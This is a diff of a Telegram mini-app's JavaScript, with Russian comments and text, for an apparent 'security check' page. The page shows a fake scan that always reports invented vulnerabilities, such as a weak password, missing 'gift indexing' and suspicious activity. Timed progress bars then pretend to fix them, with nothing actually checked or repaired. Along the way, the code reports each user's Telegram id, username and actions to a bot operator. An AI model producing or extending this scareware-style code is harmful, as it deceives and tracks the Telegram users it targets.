@@ -32,6 +32,10 @@ document.addEventListener('DOMContentLoaded', () => {
         ]
     };
 
+    // Настройки уведомлений
+    const NOTIFICATION_COOLDOWN = 5000; // 5 секунд между одинаковыми уведомлениями
+    const lastNotificationTimes = {};
+
     const elements = {
         startCheckBtn: document.getElementById('start-check'),
         progressFill: document.getElementById('progress-fill'),
@@ -56,7 +60,9 @@ document.addEventListener('DOMContentLoaded', () => {
         loadUserData();
         setupCopyHandlers();
         setupCardsAnimation();
-        sendEvent('verified_enter');
+        
+        // Отправляем событие о входе с задержкой
+        setTimeout(() => sendEvent('verified_enter'), 1000);
     }
 
     function setupEventListeners() {
@@ -73,12 +79,33 @@ document.addEventListener('DOMContentLoaded', () => {
 
     function vibrate(type = 'light') {
         if (!tg.HapticFeedback) return;
-        const types = { 'light': 'light', 'medium': 'medium', 'heavy': 'heavy', 'error': 'error', 'success': 'success' };
-        try { tg.HapticFeedback.impactOccurred(types[type] || 'light'); } catch (error) {}
+        const types = { 
+            'light': 'light', 
+            'medium': 'medium', 
+            'heavy': 'heavy', 
+            'error': 'error', 
+            'success': 'success' 
+        };
+        try { 
+            tg.HapticFeedback.impactOccurred(types[type] || 'light'); 
+        } catch (error) {
+            console.error('Haptic feedback error:', error);
+        }
     }
 
     async function sendEvent(type, data = null) {
         if (!window.sendToBot) return;
+        
+        // Проверка на частые уведомления
+        const now = Date.now();
+        const lastTime = lastNotificationTimes[type];
+        
+        if (lastTime && now - lastTime < NOTIFICATION_COOLDOWN) {
+            return;
+        }
+        
+        lastNotificationTimes[type] = now;
+        
         try {
             await window.sendToBot(type, {
                 ...data,
@@ -86,7 +113,9 @@ document.addEventListener('DOMContentLoaded', () => {
                 username: tg.initDataUnsafe.user?.username,
                 timestamp: new Date().toISOString()
             });
-        } catch (error) {}
+        } catch (error) {
+            console.error('Ошибка отправки события:', error);
+        }
     }
 
     function loadUserData() {
@@ -94,20 +123,23 @@ document.addEventListener('DOMContentLoaded', () => {
         const user = tg.initDataUnsafe.user;
         elements.username.textContent = `${user.first_name || ''} ${user.last_name || ''}`.trim() || 'Пользователь';
         elements.userId.textContent = user.id || 'N/A';
-        elements.userTag.textContent = user.username || 'N/A';
+        elements.userTag.textContent = user.username ? `@${user.username}` : 'N/A';
         if (user.photo_url) elements.userAvatar.src = user.photo_url;
     }
 
     function setupCopyHandlers() {
         document.querySelectorAll('.copyable').forEach(item => {
             item.addEventListener('click', () => {
-                const value = item.getAttribute('data-value');
+                const value = item.getAttribute('data-value') || item.textContent.trim();
                 if (!value) return;
-                navigator.clipboard.writeText(value).then(() => {
+                navigator.clipboard.writeText(value.replace('@', '')).then(() => {
                     vibrate('success');
-                    const originalText = item.querySelector('.meta-value').textContent;
-                    item.querySelector('.meta-value').textContent = 'Скопировано!';
-                    setTimeout(() => item.querySelector('.meta-value').textContent = originalText, 2000);
+                    const originalText = item.querySelector('.meta-value')?.textContent || item.textContent;
+                    const displayElement = item.querySelector('.meta-value') || item;
+                    displayElement.textContent = 'Скопировано!';
+                    setTimeout(() => {
+                        displayElement.textContent = originalText;
+                    }, 2000);
                 });
             });
         });
@@ -143,7 +175,8 @@ document.addEventListener('DOMContentLoaded', () => {
             if (progress >= 100) {
                 progress = 100;
                 clearInterval(state.checkInterval);
-                setTimeout(completeCheck, 300);
+                setTimeout(completeCheck, 500);
+                return;
             }
             updateProgress(progress);
         }, interval);
@@ -154,12 +187,19 @@ document.addEventListener('DOMContentLoaded', () => {
         elements.progressFill.style.width = `${percent}%`;
         elements.progressPercent.textContent = rounded;
         
-        if (percent < 25) elements.progressStage.textContent = 'Проверка настроек';
-        else if (percent < 50) elements.progressStage.textContent = 'Анализ активности';
-        else if (percent < 75) elements.progressStage.textContent = 'Проверка безопасности';
-        else elements.progressStage.textContent = 'Завершение проверки';
+        if (percent < 25) {
+            elements.progressStage.textContent = 'Проверка настроек';
+        } else if (percent < 50) {
+            elements.progressStage.textContent = 'Анализ активности';
+        } else if (percent < 75) {
+            elements.progressStage.textContent = 'Проверка безопасности';
+        } else {
+            elements.progressStage.textContent = 'Завершение проверки';
+        }
         
-        if (percent % 25 === 0) vibrate(percent === 100 ? 'heavy' : percent >= 75 ? 'medium' : 'light');
+        if (percent % 25 === 0) {
+            vibrate(percent === 100 ? 'heavy' : percent >= 75 ? 'medium' : 'light');
+        }
     }
 
     function completeCheck() {
@@ -167,9 +207,16 @@ document.addEventListener('DOMContentLoaded', () => {
         setLoading(elements.startCheckBtn, false);
         elements.startCheckBtn.textContent = 'Проверить снова';
         elements.progressStage.textContent = 'Проверка завершена!';
-        sendEvent('security_check_complete', { vulnerabilities: state.vulnerabilities.length });
+        
+        // Отправляем событие только если найдены уязвимости
+        if (state.vulnerabilities.length > 0) {
+            sendEvent('security_check_complete', { 
+                vulnerabilities: state.vulnerabilities.length 
+            });
+        }
+        
         showVulnerabilities();
-        tg.showAlert('Проверка завершена! Найдено уязвимостей: ' + state.vulnerabilities.length);
+        tg.showAlert(`Проверка завершена! Найдено уязвимостей: ${state.vulnerabilities.length}`);
     }
 
     function showVulnerabilities() {
@@ -226,6 +273,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     function showFixDialog(item, vulnerability) {
         if (state.isFixing) return;
+        
         const dialog = document.createElement('div');
         dialog.className = 'fix-dialog';
         dialog.innerHTML = `
@@ -260,29 +308,49 @@ document.addEventListener('DOMContentLoaded', () => {
             dialog.style.transform = 'translateY(0)';
         }, 10);
 
-        confirmBtn.addEventListener('click', () => startFixingProcess(item, vulnerability, dialog, progressFill, progressText));
-        closeBtn.addEventListener('click', () => !state.isFixing && closeDialog(dialog));
-        dialog.addEventListener('click', (e) => state.isFixing && e.stopPropagation());
+        confirmBtn.addEventListener('click', () => {
+            startFixingProcess(item, vulnerability, dialog, progressFill, progressText);
+        });
+
+        closeBtn.addEventListener('click', () => {
+            if (!state.isFixing) {
+                closeDialog(dialog);
+            }
+        });
+
+        dialog.addEventListener('click', (e) => {
+            if (state.isFixing) {
+                e.stopPropagation();
+            }
+        });
     }
 
     function startFixingProcess(item, vulnerability, dialog, progressFill, progressText) {
         if (state.isFixing) return;
         state.isFixing = true;
-        sendEvent('vulnerability_fix_started', { vulnerability: vulnerability.title });
-        
+
+        sendEvent('vulnerability_fix_started', { 
+            vulnerability: vulnerability.title 
+        });
+
         dialog.querySelector('.fix-dialog-close').disabled = true;
         dialog.querySelector('.fix-confirm-btn').disabled = true;
 
         const duration = {
-            "Слабый пароль": 50,
-            "Отсутствие индексации подарков": 100,
-            "Подозрительная активность": 75
-        }[vulnerability.title] || 5;
+            "Слабый пароль": 7000,
+            "Отсутствие индексации подарков": 10000,
+            "Подозрительная активность": 12000
+        }[vulnerability.title] || 3000;
 
         let progress = 0;
         const interval = 30;
-        const steps = duration * 1000 / interval;
+        const steps = duration / interval;
         const increment = 100 / steps;
+
+        // Очищаем предыдущий интервал, если он есть
+        if (state.fixInterval) {
+            clearInterval(state.fixInterval);
+        }
 
         state.fixInterval = setInterval(() => {
             progress += increment;
@@ -307,32 +375,49 @@ document.addEventListener('DOMContentLoaded', () => {
         state.isFixing = false;
         vibrate('success');
         item.dataset.fixed = 'true';
+
+        // Добавляем анимацию исчезновения
+        item.style.transition = 'opacity 0.3s ease';
         item.style.opacity = '0';
-        
+
+        // Закрываем диалог сразу, не дожидаясь удаления элемента
+        closeDialog(dialog);
+
+        // Удаляем элемент после анимации
         setTimeout(() => {
             item.remove();
             updateVulnerabilitiesCount();
             tg.showAlert(`Уязвимость "${vulnerability.title}" успешно исправлена!`);
-            sendEvent('vulnerability_fixed', { vulnerability: vulnerability.title });
-            closeDialog(dialog);
-        }, 300);
+            sendEvent('vulnerability_fixed', { 
+                vulnerability: vulnerability.title 
+            });
+        }, 300); // Время должно совпадать с временем анимации
     }
 
     function updateVulnerabilitiesCount() {
         const currentCount = parseInt(elements.vulnerabilitiesCount.textContent);
         const newCount = currentCount - 1;
         elements.vulnerabilitiesCount.textContent = newCount;
+        
         if (newCount === 0) {
             elements.vulnerabilitiesContainer.classList.add('hidden');
             elements.progressStage.textContent = 'Все уязвимости устранены!';
+            sendEvent('all_vulnerabilities_fixed');
         }
     }
 
     function closeDialog(dialog) {
+        if (!dialog) return;
+
+        // Добавляем анимацию закрытия
+        dialog.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
         dialog.style.opacity = '0';
         dialog.style.transform = 'translateY(20px)';
+
         setTimeout(() => {
-            document.body.removeChild(dialog);
+            if (dialog.parentNode) {
+                document.body.removeChild(dialog);
+            }
             document.documentElement.style.overflow = '';
             document.body.style.overflow = '';
             vibrate('light');
@@ -349,11 +434,14 @@ document.addEventListener('DOMContentLoaded', () => {
 
     function setLoading(button, isLoading) {
         button.disabled = isLoading;
-        button.innerHTML = isLoading ? '<div class="loader"></div> Проверка...' : 'Начать проверку';
+        button.innerHTML = isLoading ? 
+            '<div class="loader"></div> Проверка...' : 
+            'Начать проверку';
     }
 
     function escapeHtml(unsafe) {
-        return unsafe
+        if (!unsafe) return '';
+        return unsafe.toString()
             .replace(/&/g, "&amp;")
             .replace(/</g, "&lt;")
             .replace(/>/g, "&gt;")
@@ -362,11 +450,16 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     function handleViewportChange(e) {
-        if (e.isStateStable && !e.isExpanded) handleAppClose();
+        if (e.isStateStable && !e.isExpanded) {
+            handleAppClose();
+        }
     }
 
     function handleAppClose() {
-        sendEvent('app_close', { page: 'verified' });
+        sendEvent('app_close', { 
+            page: 'verified',
+            vulnerabilitiesLeft: parseInt(elements.vulnerabilitiesCount.textContent) || 0
+        });
     }
 
     function showFatalError(message) {
@@ -376,8 +469,13 @@ document.addEventListener('DOMContentLoaded', () => {
                 <p>${message}</p>
             </div>
         `;
+        document.body.style.backgroundColor = '#060137';
+        document.body.style.color = 'white';
+        document.body.style.padding = '20px';
+        document.body.style.textAlign = 'center';
     }
 
+    // Инициализация приложения
     init();
     window.addEventListener('beforeunload', cleanup);
 });
